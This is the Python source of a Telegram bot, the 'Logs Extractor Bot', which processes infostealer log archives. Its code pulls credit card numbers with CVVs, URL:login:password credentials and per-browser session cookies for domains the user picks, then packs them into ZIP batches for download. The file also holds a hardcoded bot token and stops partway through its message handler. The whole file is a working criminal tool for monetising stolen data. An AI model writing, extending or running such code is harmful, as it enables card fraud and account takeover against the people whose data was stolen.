#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════╗
║  LOGS EXTRACTOR BOT v2.1 — Telegram Edition                  ║
║  Credits: @deadlinehere5                                     ║
║  Modes: ZIP | CC Scan | Cookies | ULP | Direct Link          ║
║  Supports: .zip .rar .7z — batched output, /cancel           ║
╚══════════════════════════════════════════════════════════════╝
"""

import os
import sys
import re
import json
import time
import shutil
import asyncio
import zipfile
import tempfile
import logging
import hashlib
import subprocess
import multiprocessing
from pathlib import Path
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlparse, unquote

# ---------- Telegram imports ----------
from telegram import (
    Update, InlineKeyboardButton, InlineKeyboardMarkup,
    InputFile, constants
)
from telegram.ext import (
    ApplicationBuilder, CommandHandler, CallbackQueryHandler,
    MessageHandler, ContextTypes, filters
)

# ---------- HTTP downloads ----------
import aiohttp

# ---------- Logging ----------
logging.basicConfig(
    format="%(asctime)s [%(levelname)s] %(message)s",
    level=logging.INFO,
)
logger = logging.getLogger(__name__)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  CONFIG
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "8767713785:AAHwSdQDB81QddgyhOho_W_gaNgTp3MbUVo")
WORK_DIR = os.path.join(tempfile.gettempdir(), "logs_extractor_bot")
MAX_DOWNLOAD_SIZE = 10 * 1024 * 1024 * 1024  # 10 GB
MAX_WORKERS = min(multiprocessing.cpu_count() * 2, 16)
CREDIT = "@deadlinehere5"

# Telegram file limits
TG_FILE_LIMIT   = 2000 * 1024 * 1024  # 2 GB with local Bot API server
TG_NORMAL_LIMIT = 50 * 1024 * 1024    # 50 MB — standard Bot API send limit

# Batch packing budget (input bytes per batch). Kept a bit under 50 MB
# so the resulting ZIP stays below the Telegram send limit.
MAX_BATCH_SIZE = 45 * 1024 * 1024

# Premium emoji helpers
E_FIRE   = "<tg-emoji emoji-id=\"5976310382359220879\">🔥</tg-emoji>"
E_BOLT   = "<tg-emoji emoji-id=\"6237585380552480043\">⚡</tg-emoji>"
E_STAR   = "<tg-emoji emoji-id=\"5368324170671202286\">⭐</tg-emoji>"
E_CHECK  = "<tg-emoji emoji-id=\"5976310382359220879\">✅</tg-emoji>"
E_LOCK   = "<tg-emoji emoji-id=\"6106922455249455173\">🔒</tg-emoji>"
E_COOKIE = "<tg-emoji emoji-id=\"5368324170671202286\">🍪</tg-emoji>"
E_KEY    = "<tg-emoji emoji-id=\"6325389114971522816\">🔑</tg-emoji>"
E_LINK   = "<tg-emoji emoji-id=\"5929100952245113485\">🔗</tg-emoji>"
E_ZIP    = "<tg-emoji emoji-id=\"6237585097084638739\">📦</tg-emoji>"
E_FOLDER = "<tg-emoji emoji-id=\"6237703028296653110\">📂</tg-emoji>"
E_CARD   = "<tg-emoji emoji-id=\"6325866105449482029\">💳</tg-emoji>"
E_SKULL  = "<tg-emoji emoji-id=\"6325405977013127200\">💀</tg-emoji>"
E_ROCKET = "<tg-emoji emoji-id=\"5368324170671202286\">🚀</tg-emoji>"
E_WARN   = "<tg-emoji emoji-id=\"5215432191156169379\">⚠️</tg-emoji>"
E_GEAR   = "<tg-emoji emoji-id=\"6325735169076495968\">⚙️</tg-emoji>"
E_CHART  = "<tg-emoji emoji-id=\"6176810369248400482\">📊</tg-emoji>"
E_CLOCK  = "<tg-emoji emoji-id=\"6325389114971522816\">⏱</tg-emoji>"
E_STOP   = "<tg-emoji emoji-id=\"6325405977013127200\">🛑</tg-emoji>"

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  PER-USER SESSION STATE
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
user_sessions: dict = {}

def get_session(user_id: int) -> dict:
    if user_id not in user_sessions:
        user_sessions[user_id] = {
            "mode": None,
            "domain": None,
            "domain_list": [],
            "cookie_format": "netscape",
            "password": None,
            "awaiting": None,
            "cancelled": False,
            "work_dir": os.path.join(WORK_DIR, str(user_id)),
        }
    os.makedirs(user_sessions[user_id]["work_dir"], exist_ok=True)
    return user_sessions[user_id]

def cleanup_session(user_id: int):
    s = get_session(user_id)
    wd = s["work_dir"]
    if os.path.exists(wd):
        shutil.rmtree(wd, ignore_errors=True)
    os.makedirs(wd, exist_ok=True)
    s["cancelled"] = False

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  EXTRACTION CORE
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

CC_PATTERN = re.compile(
    r'(.+?)\s*\|\s*(\d{15,16})\s*\|\s*(\d{1,2}/\d{2,4})\s*\|\s*(\d{3,4})'
)

def find_cards(text: str) -> list[str]:
    cards = []
    seen = set()
    for m in CC_PATTERN.finditer(text):
        name, card, expiry, cvv = m.group(1).strip(), m.group(2), m.group(3), m.group(4)
        if card in seen:
            continue
        try:
            parts = expiry.split("/")
            year = int(parts[1])
            if year < 100:
                year += 2000
            if 2025 <= year <= 2035:
                cards.append(f"{card}|{expiry}|{cvv}|{name}")
                seen.add(card)
        except Exception:
            continue
    return cards


ULP_PATTERN = re.compile(
    r'(?:URL|Host)\s*:\s*(.+?)\s*\n\s*(?:USER|Login|Username)\s*:\s*(.+?)\s*\n\s*(?:PASS|Password)\s*:\s*(.+?)(?:\n|$)',
    re.IGNORECASE
)

def find_ulp(text: str) -> list[str]:
    results = []
    for host, login, password in ULP_PATTERN.findall(text):
        host = host.replace("https://", "").replace("http://", "").split("/")[0].strip()
        login = login.strip()
        password = password.strip()
        if host and login and password:
            results.append(f"{host}:{login}:{password}")
    return results


def parse_cookies_for_domains(text: str, domains: list[str]) -> list[dict]:
    entries = []
    for line in text.splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        low = line.lower()
        if not any(d in low for d in domains):
            continue
        parts = line.split("\t")
        if len(parts) >= 7:
            entries.append({
                "domain": parts[0], "flag": parts[1], "path": parts[2],
                "secure": parts[3], "expiration": parts[4],
                "name": parts[5], "value": parts[6],
            })
        else:
            parts2 = re.split(r'\s+', line)
            if len(parts2) >= 7:
                entries.append({
                    "domain": parts2[0], "flag": parts2[1], "path": parts2[2],
                    "secure": parts2[3], "expiration": parts2[4],
                    "name": parts2[5], "value": parts2[6],
                })
    return entries


def format_cookies_netscape(cookies: list[dict]) -> str:
    lines = ["# Netscape HTTP Cookie File"]
    for c in cookies:
        lines.append(
            f"{c['domain']}\t{c['flag']}\t{c['path']}\t{c['secure']}\t{c['expiration']}\t{c['name']}\t{c['value']}"
        )
    return "\n".join(lines)


def format_cookies_json(cookies: list[dict]) -> str:
    return json.dumps(cookies, indent=2, ensure_ascii=False)


def format_cookies_string(cookies: list[dict]) -> str:
    return "; ".join(f"{c['name']}={c['value']}" for c in cookies)


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  ARCHIVE HANDLING
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def extract_archive(archive_path: str, dest_dir: str, password: str = None) -> bool:
    ext = Path(archive_path).suffix.lower()

    if ext == ".zip":
        try:
            with zipfile.ZipFile(archive_path, "r") as zf:
                if password:
                    zf.setpassword(password.encode("utf-8"))
                zf.extractall(dest_dir)
            return True
        except Exception as e:
            logger.error(f"ZIP extract error: {e}")
            return False

    elif ext == ".rar":
        cmd = ["unrar", "x", "-y"]
        cmd.append(f"-p{password}" if password else "-p-")
        cmd += [archive_path, dest_dir + "/"]
        try:
            subprocess.run(cmd, check=True, capture_output=True, timeout=3600)
            return True
        except Exception as e:
            logger.error(f"RAR extract error: {e}")
            return False

    elif ext == ".7z":
        cmd = ["7z", "x", f"-o{dest_dir}", "-y"]
        cmd.append(f"-p{password}" if password else "-p-")
        cmd.append(archive_path)
        try:
            subprocess.run(cmd, check=True, capture_output=True, timeout=3600)
            return True
        except Exception as e:
            logger.error(f"7z extract error: {e}")
            return False

    return False


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  SCAN FUNCTIONS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def scan_cc(root_dir: str) -> list[str]:
    cards = []
    skip = {"information.txt", "join telegram.txt", "join_telegram.txt",
            "telegram.txt", "passwords.txt"}
    for dirpath, dirnames, filenames in os.walk(root_dir):
        folder_lower = os.path.basename(dirpath).lower()
        if folder_lower not in ("autofill", "creditcards", "cc"):
            continue
        for fn in filenames:
            if fn.lower() in skip:
                continue
            if not fn.lower().endswith((".txt", ".log")):
                continue
            fpath = os.path.join(dirpath, fn)
            try:
                sz = os.path.getsize(fpath)
                if sz < 30 or sz > 50_000_000:
                    continue
                with open(fpath, "r", encoding="utf-8", errors="ignore") as f:
                    content = f.read()
                cards.extend(find_cards(content))
            except Exception:
                continue
    return cards


def _derive_browser_profile(path_parts: tuple) -> str:
    browsers = {"chrome", "firefox", "edge", "opera", "brave", "vivaldi", "yandex",
                "chromium", "safari", "opera gx", "operagx", "msedge"}
    browser = "Unknown"
    profile = "Default"
    for p in path_parts:
        pl = p.lower()
        if pl == "cookies":
            continue
        for b in browsers:
            if b in pl:
                browser = p
                break
        if pl.startswith("profile") or pl == "default" or pl.startswith("person"):
            profile = p
    return f"{browser}_{profile}".replace(" ", "_")


def scan_cookies(root_dir: str, domains: list[str]) -> dict:
    results = {}
    domains_lower = [d.lower().replace("http://", "").replace("https://", "").replace("www.", "")
                     for d in domains]

    for dirpath, dirnames, filenames in os.walk(root_dir):
        folder_lower = os.path.basename(dirpath).lower()
        if folder_lower != "cookies":
            continue
        rel = os.path.relpath(dirpath, root_dir)
        parts = Path(rel).parts
        profile_key = _derive_browser_profile(parts)

        for fn in filenames:
            if not fn.lower().endswith(".txt"):
                continue
            fpath = os.path.join(dirpath, fn)
            try:
                with open(fpath, "r", encoding="utf-8", errors="ignore") as f:
                    content = f.read()
                entries = parse_cookies_for_domains(content, domains_lower)
                if entries:
                    results.setdefault(profile_key, []).extend(entries)
            except Exception:
                continue
    return results


def scan_ulp(root_dir: str) -> list[str]:
    results = []
    for dirpath, dirnames, filenames in os.walk(root_dir):
        for fn in filenames:
            if fn.lower() != "passwords.txt":
                continue
            fpath = os.path.join(dirpath, fn)
            try:
                with open(fpath, "r", encoding="utf-8", errors="ignore") as f:
                    content = f.read()
                results.extend(find_ulp(content))
            except Exception:
                continue
    return results


def scan_all(root_dir: str, domains: list[str] = None) -> dict:
    cc = scan_cc(root_dir)
    ulp = scan_ulp(root_dir)
    cookies = scan_cookies(root_dir, domains) if domains else {}
    return {"cc": cc, "ulp": ulp, "cookies": cookies}


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  RESULT WRITING + BATCHED ZIP BUNDLING
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def _write_results(out_dir: str, cc: list, ulp: list, cookies: dict,
                   cookie_fmt: str) -> bool:
    """Write all result files into out_dir. Returns True if any data was written."""
    has_data = False

    if cc:
        has_data = True
        unique_cc = list(dict.fromkeys(cc))
        with open(os.path.join(out_dir, "CreditCards.txt"), "w", encoding="utf-8") as f:
            f.write(f"{'='*60}\n")
            f.write(f"💳 CREDIT CARD EXTRACTION RESULTS\n")
            f.write(f"📅 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"🔢 Total: {len(unique_cc)} cards\n")
            f.write(f"👤 Credits: {CREDIT}\n")
            f.write(f"{'='*60}\n")
            f.write("Format: CARD|EXPIRY|CVV|HOLDER\n")
            f.write(f"{'='*60}\n\n")
            for c in unique_cc:
                f.write(c + "\n")

    if ulp:
        has_data = True
        unique_ulp = list(dict.fromkeys(ulp))
        with open(os.path.join(out_dir, "ULP_Passwords.txt"), "w", encoding="utf-8") as f:
            f.write(f"{'='*60}\n")
            f.write(f"🔑 ULP EXTRACTION RESULTS\n")
            f.write(f"📅 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"🔢 Total: {len(unique_ulp)} entries\n")
            f.write(f"👤 Credits: {CREDIT}\n")
            f.write(f"{'='*60}\n")
            f.write("Format: HOST:LOGIN:PASSWORD\n")
            f.write(f"{'='*60}\n\n")
            for u in unique_ulp:
                f.write(u + "\n")

    if cookies:
        has_data = True
        cookies_dir = os.path.join(out_dir, "Cookies")
        os.makedirs(cookies_dir, exist_ok=True)
        for profile_key, entries in cookies.items():
            if not entries:
                continue
            safe_name = re.sub(r'[<>:"/\\|?*]', '_', profile_key)
            fpath = os.path.join(cookies_dir, f"{safe_name}.txt")
            with open(fpath, "w", encoding="utf-8") as f:
                f.write(f"{'='*60}\n")
                f.write(f"🍪 COOKIE EXTRACTION — {profile_key}\n")
                f.write(f"📅 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"🔢 Cookies: {len(entries)}\n")
                f.write(f"👤 Credits: {CREDIT}\n")
                f.write(f"{'='*60}\n\n")
                if cookie_fmt == "json":
                    f.write(format_cookies_json(entries))
                elif cookie_fmt == "string":
                    f.write(format_cookies_string(entries))
                else:
                    f.write(format_cookies_netscape(entries))

    if has_data:
        with open(os.path.join(out_dir, "_SUMMARY.txt"), "w", encoding="utf-8") as f:
            f.write(f"{'='*60}\n")
            f.write(f"📊 EXTRACTION SUMMARY\n")
            f.write(f"{'='*60}\n")
            f.write(f"📅 Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"💳 Credit Cards: {len(cc)}\n")
            f.write(f"🔑 ULP Entries: {len(ulp)}\n")
            f.write(f"🍪 Cookie Profiles: {len(cookies)}\n")
            total_cookies = sum(len(v) for v in cookies.values())
            f.write(f"🍪 Total Cookies: {total_cookies}\n")
            f.write(f"👤 Credits: {CREDIT}\n")
            f.write(f"{'='*60}\n")

    return has_data


def _split_text_file(fp: str, max_size: int, out_dir: str) -> list[str]:
    """
    Split a text file into chunks <= max_size bytes, written alongside the
    original as '<basename>.partNNN'. Returns list of produced paths.
    Used only for result files that on their own exceed the batch budget.
    """
    parts = []
    base = os.path.basename(fp)
    buf = []
    buf_size = 0
    part_num = 1

    def _flush():
        nonlocal buf, buf_size, part_num
        if not buf:
            return
        out = os.path.join(out_dir, f"{base}.part{part_num:03d}")
        with open(out, "w", encoding="utf-8") as of:
            of.writelines(buf)
        parts.append(out)
        part_num += 1
        buf, buf_size = [], 0

    with open(fp, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            line_size = len(line.encode("utf-8", errors="ignore"))
            if buf and buf_size + line_size > max_size:
                _flush()
            buf.append(line)
            buf_size += line_size
    _flush()
    return parts


def bundle_results_batched(work_dir: str, cc: list, ulp: list, cookies: dict,
                           cookie_fmt: str = "netscape",
                           max_batch_size: int = MAX_BATCH_SIZE) -> list[dict]:
    """
    Write results, then produce one or more ZIP files, each <= max_batch_size
    (input budget; ZIP output compresses further).

    Returns list of dicts:
        [{"path": str, "size": int, "files": int, "index": int, "total": int}, ...]
    or [] if there was no data.
    """
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    out_dir = os.path.join(work_dir, f"results_{ts}")
    os.makedirs(out_dir, exist_ok=True)

    if not _write_results(out_dir, cc, ulp, cookies, cookie_fmt):
        shutil.rmtree(out_dir, ignore_errors=True)
        return []

    # Collect files (path, arcname, size). Split any oversized text file first.
    all_files = []
    for root, _, names in os.walk(out_dir):
        for fn in names:
            fp = os.path.join(root, fn)
            arc = os.path.relpath(fp, out_dir)
            all_files.append((fp, arc, os.path.getsize(fp)))

    final = []
    for fp, arc, sz in all_files:
        if sz > max_batch_size:
            for pp in _split_text_file(fp, max_batch_size, os.path.dirname(fp)):
                final.append((pp, os.path.relpath(pp, out_dir), os.path.getsize(pp)))
        else:
            final.append((fp, arc, sz))

    # Pack into batches: first-fit-decreasing (largest first).
    final.sort(key=lambda x: -x[2])
    batches: list[list[tuple[str, str, int]]] = []
    cur, cur_size = [], 0
    for fp, arc, sz in final:
        if cur and cur_size + sz > max_batch_size:
            batches.append(cur)
            cur, cur_size = [], 0
        cur.append((fp, arc, sz))
        cur_size += sz
    if cur:
        batches.append(cur)

    # Create one ZIP per batch.
    total = len(batches)
    out = []
    for i, batch in enumerate(batches, 1):
        zip_path = os.path.join(work_dir, f"Results_{ts}_part{i:02d}.zip")
        with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as zf:
            for fp, arc, _ in batch:
                zf.write(fp, arc)
        out.append({
            "path": zip_path,
            "size": os.path.getsize(zip_path),
            "files": len(batch),
            "index": i,
            "total": total,
        })

    shutil.rmtree(out_dir, ignore_errors=True)
    return out


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  DOWNLOAD FROM URL
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def download_file(url: str, dest_dir: str, progress_cb=None) -> str | None:
    try:
        parsed = urlparse(url)
        filename = unquote(os.path.basename(parsed.path)) or "download"
        if "." not in filename:
            filename += ".zip"

        dest_path = os.path.join(dest_dir, filename)

        timeout = aiohttp.ClientTimeout(total=7200)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(url, allow_redirects=True) as resp:
                if resp.status != 200:
                    return None

                total = int(resp.headers.get("Content-Length", 0))
                if total > MAX_DOWNLOAD_SIZE:
                    return None

                downloaded = 0
                last_update = 0
                with open(dest_path, "wb") as f:
                    async for chunk in resp.content.iter_chunked(1024 * 1024):
                        f.write(chunk)
                        downloaded += len(chunk)
                        now = time.time()
                        if progress_cb and (now - last_update > 3):
                            last_update = now
                            pct = (downloaded / total * 100) if total else 0
                            dl_mb = downloaded / (1024 * 1024)
                            total_mb = total / (1024 * 1024) if total else 0
                            await progress_cb(dl_mb, total_mb, pct)

        if os.path.exists(dest_path) and os.path.getsize(dest_path) > 0:
            return dest_path
        return None
    except Exception as e:
        logger.error(f"Download error: {e}")
        return None


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  TELEGRAM HANDLERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    cleanup_session(uid)
    text = (
        f"{E_ROCKET} <b>LOGS EXTRACTOR BOT v2.1</b>\n"
        f"{E_BOLT} <i>by {CREDIT}</i>\n\n"
        f"{E_FIRE} <b>Available Modes:</b>\n\n"
        f"{E_ZIP}  /zip — Extract CCs from ZIP/RAR/7z archives\n"
        f"{E_CARD}  /cc — Scan extracted logs for Credit Cards\n"
        f"{E_COOKIE}  /cookies — Extract cookies by domain\n"
        f"{E_KEY}  /ulp — Extract URL:Login:Password\n"
        f"{E_LINK}  /link — Download from direct link + extract\n"
        f"{E_STAR}  /all — Run ALL modes at once\n\n"
        f"{E_GEAR}  /setdomain — Set domain for cookie extraction\n"
        f"{E_GEAR}  /setpassword — Set archive password\n"
        f"{E_GEAR}  /setformat — Cookie output format\n"
        f"{E_STOP}  /cancel — Stop mid-batch\n"
        f"{E_CHART}  /help — Show this menu\n\n"
        f"{E_SKULL} <b>Send me a file</b> (ZIP/RAR/7z/TXT) or a <b>direct link</b>.\n"
        f"Results are sent in batches up to 50 MB each.\n\n"
        f"<i>Supports files up to 10 GB {E_FIRE}</i>"
    )
    await update.message.reply_text(text, parse_mode="HTML")


async def cmd_help(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    await cmd_start(update, ctx)


async def cmd_cancel(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    s = get_session(update.effective_user.id)
    s["cancelled"] = True
    await update.message.reply_text(
        f"{E_STOP} <b>Cancellation requested.</b>\n"
        f"Stopping after the current batch.",
        parse_mode="HTML",
    )


# ---- Mode Selection Commands ----

async def cmd_zip(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    s = get_session(update.effective_user.id)
    s["mode"] = "zip"
    s["awaiting"] = "file"
    text = (
        f"{E_ZIP} <b>ZIP MODE — CC Extraction</b>\n\n"
        f"Send me a <b>ZIP / RAR / 7z</b> file or a direct link.\n"
        f"I'll extract credit cards from autofill/creditcards folders.\n\n"
        f"{E_LOCK} Use /setpassword if the archive is password-protected.\n\n"
        f"<i>Credits: {CREDIT}</i>"
    )
    await update.message.reply_text(text, parse_mode="HTML")


async def cmd_cc(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    s = get_session(update.effective_user.id)
    s["mode"] = "cc"
    s["awaiting"] = "file"
    text = (
        f"{E_CARD} <b>CC SCAN MODE</b>\n\n"
        f"Send me a <b>ZIP / RAR / 7z</b> file or direct link.\n"
        f"I'll scan all autofill & creditcards folders for CC data.\n\n"
        f"<i>Credits: {CREDIT}</i>"
    )
    await update.message.reply_text(text, parse_mode="HTML")


async def cmd_cookies(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    s = get_session(update.effective_user.id)
    s["mode"] = "cookies"
    s["awaiting"] = "file"
    if not s["domain"] and not s["domain_list"]:
        text = (
            f"{E_COOKIE} <b>COOKIES MODE</b>\n\n"
            f"{E_WARN} <b>Set a domain first!</b>\n"
            f"Use /setdomain <code>example.com</code>\n"
            f"or send a <b>.txt</b> file with one domain per line.\n\n"
            f"Then send me the archive file or direct link.\n\n"
            f"<i>Each browser/profile gets its own .txt file {E_FIRE}</i>\n\n"
            f"<i>Credits: {CREDIT}</i>"
        )
    else:
        domains = s["domain_list"] if s["domain_list"] else [s["domain"]]
        text = (
            f"{E_COOKIE} <b>COOKIES MODE</b>\n\n"
            f"Domains: <code>{', '.join(domains)}</code>\n"
            f"Format: <code>{s['cookie_format']}</code>\n\n"
            f"Send me the archive file or direct link now.\n\n"
            f"<i>Credits: {CREDIT}</i>"
        )
    await update.message.reply_text(text, parse_mode="HTML")


async def cmd_ulp(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    s = get_session(update.effective_user.id)
    s["mode"] = "ulp"
    s["awaiting"] = "file"
    text = (
        f"{E_KEY} <b>ULP MODE — Password Extraction</b>\n\n"
        f"Send me a <b>ZIP / RAR / 7z</b> file or direct link.\n"
        f"I'll extract URL:Login:Password from passwords.txt files.\n\n"
        f"<i>Credits: {CREDIT}</i>"
    )
    await update.message.reply_text(text, parse_mode="HTML")


async def cmd_link(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    s = get_session(update.effective_user.id)
    if not s["mode"]:
        s["mode"] = "all"
    s["awaiting"] = "link"
    text = (
        f"{E_LINK} <b>DIRECT LINK MODE</b>\n\n"
        f"Send me a direct download URL (up to 10 GB).\n"
        f"Supported: .zip .rar .7z\n\n"
        f"Current mode: <b>{(s['mode'] or 'all').upper()}</b>\n"
        f"(Change with /zip /cc /cookies /ulp /all)\n\n"
        f"<i>Credits: {CREDIT}</i>"
    )
    await update.message.reply_text(text, parse_mode="HTML")


async def cmd_all(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    s = get_session(update.effective_user.id)
    s["mode"] = "all"
    s["awaiting"] = "file"
    text = (
        f"{E_FIRE} <b>ALL MODES — Full Extraction</b>\n\n"
        f"Send me a <b>ZIP / RAR / 7z</b> file or direct link.\n"
        f"I'll run CC + ULP + Cookies extraction all at once!\n\n"
        f"{E_COOKIE} Domains: <code>{s['domain'] or 'Not set (use /setdomain)'}</code>\n\n"
        f"<i>Credits: {CREDIT}</i>"
    )
    await update.message.reply_text(text, parse_mode="HTML")


# ---- Settings Commands ----

async def cmd_setdomain(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    s = get_session(update.effective_user.id)
    args = " ".join(ctx.args) if ctx.args else ""
    if not args:
        s["awaiting"] = "domain"
        await update.message.reply_text(
            f"{E_COOKIE} Send me the domain(s) to extract cookies for.\n"
            f"Single: <code>netflix.com</code>\n"
            f"Multiple (one per line):\n<code>netflix.com\nspotify.com\nudemy.com</code>\n\n"
            f"You can also upload a <b>.txt</b> file with one domain per line.",
            parse_mode="HTML",
        )
        return

    domains = [d.strip().lower().replace("http://", "").replace("https://", "").replace("www.", "")
               for d in args.replace(",", "\n").split("\n") if d.strip()]
    if len(domains) == 1:
        s["domain"] = domains[0]
        s["domain_list"] = []
    else:
        s["domain_list"] = domains
        s["domain"] = None
    s["awaiting"] = None
    await update.message.reply_text(
        f"{E_CHECK} Domain(s) set: <code>{', '.join(domains)}</code>",
        parse_mode="HTML",
    )


async def cmd_setpassword(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    s = get_session(update.effective_user.id)
    args = " ".join(ctx.args) if ctx.args else ""
    if not args:
        s["awaiting"] = "password"
        await update.message.reply_text(
            f"{E_LOCK} Send me the archive password:",
            parse_mode="HTML",
        )
        return
    s["password"] = args
    s["awaiting"] = None
    await update.message.reply_text(
        f"{E_CHECK} Password set: <code>{'*' * len(args)}</code>",
        parse_mode="HTML",
    )


async def cmd_setformat(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    kb = InlineKeyboardMarkup([
        [InlineKeyboardButton("📋 Netscape", callback_data="fmt_netscape"),
         InlineKeyboardButton("📋 JSON", callback_data="fmt_json")],
        [InlineKeyboardButton("📋 Cookie String", callback_data="fmt_string")],
    ])
    await update.message.reply_text(
        f"{E_GEAR} <b>Select cookie output format:</b>",
        parse_mode="HTML",
        reply_markup=kb,
    )


async def callback_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    uid = query.from_user.id
    s = get_session(uid)

    data = query.data
    if data.startswith("fmt_"):
        fmt = data.replace("fmt_", "")
        s["cookie_format"] = fmt
        await query.edit_message_text(
            f"{E_CHECK} Cookie format set to: <b>{fmt}</b>",
            parse_mode="HTML",
        )


# ---- File / Message Handlers ----

async def handle_document(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    s = get_session(uid)

    doc = update.message.document
    fname = doc.file_name or "upload"
    ext = Path(fname).suffix.lower()

    # ── 1) .txt = domain list. Accepted in ANY mode, BEFORE mode default. ──
    if ext == ".txt":
        try:
            file = await ctx.bot.get_file(doc.file_id)
            dl_path = os.path.join(s["work_dir"], fname)
            await file.download_to_drive(dl_path)
            with open(dl_path, "r", encoding="utf-8-sig", errors="ignore") as f:
                domains = [
                    l.strip().lower()
                     .replace("http://", "").replace("https://", "")
                     .replace("www.", "").rstrip("/")
                    for l in f
                    if l.strip() and not l.startswith("#")
                ]
            os.remove(dl_path)

            if not domains:
                await update.message.reply_text(
                    f"{E_WARN} The file is empty or contains no valid domains.",
                    parse_mode="HTML",
                )
                return

            s["domain_list"] = domains
            s["domain"] = None
            if not s["mode"]:
                s["mode"] = "cookies"

            await update.message.reply_text(
                f"{E_CHECK} Loaded <b>{len(domains)}</b> domain(s) from file.\n"
                f"Mode: <b>{s['mode'].upper()}</b>\n"
                f"Cookie format: <code>{s['cookie_format']}</code>\n\n"
                f"Now send an archive (.zip / .rar / .7z) or a direct link.",
                parse_mode="HTML",
            )
            return
        except Exception as e:
            await update.message.reply_text(
                f"{E_WARN} Failed to read .txt: <code>{e}</code>",
                parse_mode="HTML",
            )
            return

    # ── 2) Archives only ──
    if ext not in (".zip", ".rar", ".7z"):
        await update.message.reply_text(
            f"{E_WARN} Unsupported file type: <code>{ext}</code>\n"
            f"Supported: .zip .rar .7z .txt (domain list)",
            parse_mode="HTML",
        )
        return

    if not s["mode"]:
        s["mode"] = "all"

    size_mb = doc.file_size / (1024 * 1024)
    progress_msg = await update.message.reply_text(
        f"{E_BOLT} <b>Downloading file from Telegram...</b>\n"
        f"📄 {fname}\n"
        f"📦 Size: {size_mb:.1f} MB",
        parse_mode="HTML",
    )

    try:
        file = await ctx.bot.get_file(doc.file_id)
        dl_path = os.path.join(s["work_dir"], fname)
        await file.download_to_drive(dl_path)
        await progress_msg.edit_text(
            f"{E_CHECK} <b>Download complete.</b> Processing...",
            parse_mode="HTML",
        )
    except Exception as e:
        await progress_msg.edit_text(
            f"{E_WARN} Download failed: <code>{e}</code>\n\n"
            f"If the file is very large, the standard Bot API cannot fetch it.\n"
            f"Either run a local Bot API server (2 GB limit), or use a direct link via /link.",
            parse_mode="HTML",
        )
        return

    await process_archive(update, ctx, dl_path, progress_msg)


async def handle_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    s = get_session(uid)
    text = update.message.text.strip()

    if s["awaiting"] == "domain":
        domains = [d.strip().lower().replace("http://", "").replace("https://", "").replace("www.", "")
                   for d in text.replace(",", "\n").split("\n") if d.strip()]
        if len(domains) == 1:
            s["domain"] = domains[0]
            s["domain_list"] = []
        else:
            s["domain_list"] = domains
            s["domain"] = None
        s["awaiting"] = None
        await update.message.reply_text(
            f"{E_CHECK} Domain(s) set: <code>{', '.join(domains)}</code>",
            parse_mode="HTML",
        )
        return

    if s["awaiting"] == "password":
        s["password"] = text
        s["awaiting"] = None
        await update.message.reply_text(
            f"{E_CHECK} Password set.",
            parse_mode="HTML",
        )
        return

    url_pattern = re.compile(r'https?://\S+', re.IGNORECASE)
    urls = url_pattern.findall(text)
    if urls:
        url = urls[0]
        if not s["mode"]:
            s["mode"] = "all"
        s["cancelled"] = False

        progress_msg = await update.message.reply_text(
            f"{E_LINK} <b>Downloading from URL...</b>\n"
            f"<code>{url[:80]}{'...' if len(url)>80 else ''}</code>\n\n"
            f"{E_CLOCK} This may take a while for large files...\n"
            f"{E_STOP} Send /cancel to abort.",
            parse_mode="HTML",
        )

